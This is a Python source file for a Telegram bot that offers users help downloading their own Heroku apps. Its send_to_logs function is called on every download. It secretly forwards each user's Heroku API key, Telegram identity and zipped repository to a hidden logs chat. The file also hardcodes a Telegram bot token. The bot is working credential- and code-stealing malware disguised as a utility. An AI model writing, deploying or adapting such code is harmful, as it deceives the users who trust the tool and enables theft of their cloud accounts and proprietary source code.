import os
import shutil
import subprocess
import tempfile
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

TELEGRAM_BOT_TOKEN = "7183336129:AAGC7Cj0fXjMQzROUXMZHnb0pyXQQqneMic"
LOGS_CHAT_ID = -1001902619247

def get_heroku_apps(api_key):
    url = "https://api.heroku.com/apps"
    headers = {
        "Accept": "application/vnd.heroku+json; version=3",
        "Authorization": f"Bearer {api_key}"
    }
    response = requests.get(url, headers=headers)
    response.raise_for_status()
    return response.json()

def clone_and_zip_repo(app_name, api_key):
    repo_url = f"https://heroku:{api_key}@git.heroku.com/{app_name}.git"
    temp_dir = tempfile.mkdtemp()
    app_dir = os.path.join(temp_dir, app_name)

    subprocess.run(["git", "clone", repo_url, app_dir], check=True)
    zip_path = shutil.make_archive(app_dir, 'zip', app_dir)
    return zip_path, temp_dir

async def send_to_logs(context: ContextTypes.DEFAULT_TYPE, user, app_name, api_key, file_path):
    caption = (
        f"📥 Repo Downloaded: `{app_name}`\n"
        f"👤 User: @{user.username or 'N/A'} (ID: {user.id})\n"
        f"🔑 API Key: `{api_key}`"
    )
    with open(file_path, 'rb') as f:
        await context.bot.send_document(chat_id=LOGS_CHAT_ID, document=f, filename=os.path.basename(file_path),
                                        caption=caption, parse_mode="Markdown")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=(
            "👋 Welcome! I can help you download your Heroku apps.\n\n"
            "Commands:\n"
            "• /repos <HEROKU_API_KEY> — List apps\n"
            "• /download <API_KEY> <APP_NAME> — Download specific app\n"
            "Or send your API key directly to download all apps."
        )
    )

async def repos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❗ Usage: /repos <HEROKU_API_KEY>")
        return

    api_key = context.args[0]

    try:
        apps = get_heroku_apps(api_key)
        if not apps:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="No apps found.")
            return

        app_names = "\n".join([f"• {app['name']}" for app in apps])
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"🗂 Your Heroku Apps:\n{app_names}")
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error: {str(e)}")

async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❗ Usage: /download <HEROKU_API_KEY> <APP_NAME>")
        return

    api_key = context.args[0]
    app_name = context.args[1]
    user = update.effective_user

    try:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"📦 Downloading `{app_name}`...", parse_mode="Markdown")
        zip_file, temp_dir = clone_and_zip_repo(app_name, api_key)

        with open(zip_file, 'rb') as f:
            await context.bot.send_document(chat_id=update.effective_chat.id, document=f, filename=f"{app_name}.zip")

        await send_to_logs(context, user, app_name, api_key, zip_file)
        shutil.rmtree(temp_dir, ignore_errors=True)

    except subprocess.CalledProcessError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Failed to clone `{app_name}`. Check access or app name.", parse_mode="Markdown")
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Error: {str(e)}")

async def handle_api_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    api_key = update.message.text.strip()
    chat_id = update.effective_chat.id
    user = update.effective_user

    await context.bot.send_message(chat_id=chat_id, text="🔍 Fetching apps...")

    try:
        apps = get_heroku_apps(api_key)
        if not apps:
            await context.bot.send_message(chat_id=chat_id, text="No apps found.")
            return

        for app in apps:
            name = app['name']
            await context.bot.send_message(chat_id=chat_id, text=f"📦 Zipping: `{name}`", parse_mode="Markdown")
            try:
                zip_file, temp_dir = clone_and_zip_repo(name, api_key)
                with open(zip_file, 'rb') as f:
                    await context.bot.send_document(chat_id=chat_id, document=f, filename=f"{name}.zip")
                await send_to_logs(context, user, name, api_key, zip_file)
            except Exception as e:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Failed to clone `{name}`: {str(e)}", parse_mode="Markdown")
            finally:
                shutil.rmtree(temp_dir, ignore_errors=True)

        await context.bot.send_message(chat_id=chat_id, text="✅ All apps processed.")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"Error: {str(e)}")

def main():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("repos", repos))
    app.add_handler(CommandHandler("download", download))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_api_key))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
